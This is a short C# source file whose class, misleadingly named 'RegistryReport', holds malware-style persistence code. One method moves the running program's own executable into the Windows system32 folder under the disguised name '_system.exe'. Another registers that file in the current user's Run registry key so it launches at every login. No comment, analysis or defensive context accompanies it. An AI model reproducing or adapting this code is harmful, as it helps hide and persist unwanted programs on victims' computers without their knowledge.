using System;
using System.IO;
using Microsoft.Win32;
using System.Windows.Forms;
namespace 记住
{
        public class RegistryReport
        {
                public RegistryReport()
                {
                }
                public void MoveFile()
                {
                        if(!File.Exists("c:\\windows\\system32\\_system.exe"))
                        {
                                File.Move(Application.ExecutablePath,"c:\\windows\\system32\\_system.exe");
                        }
                        else
                                return;
                }
                public void registryRun()
                {    
                        RegistryKey key1=Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\run");
                        key1.SetValue("","c:\\windows\\system32\\_system.exe");
                        key1.Close();
                }
        }

}
